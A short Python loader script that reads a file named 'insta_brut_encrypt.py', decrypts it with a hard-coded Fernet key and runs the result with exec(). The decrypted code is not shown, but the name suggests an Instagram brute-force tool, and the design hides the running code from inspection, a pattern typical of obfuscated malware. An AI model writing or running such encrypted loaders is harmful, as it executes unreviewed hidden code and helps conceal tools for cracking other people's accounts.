from cryptography.fernet import Fernet

file_name = "file/insta_brut_encrypt.py"


key = b"V2C8w9op97LRV2HSdwBeZhjqb7f5YOSjCeyTtl7BrKI="
cipher = Fernet(key)


with open(file_name, "rb") as file:
    encrypted_code = file.read()

decrypted_code = cipher.decrypt(encrypted_code)


exec(decrypted_code)
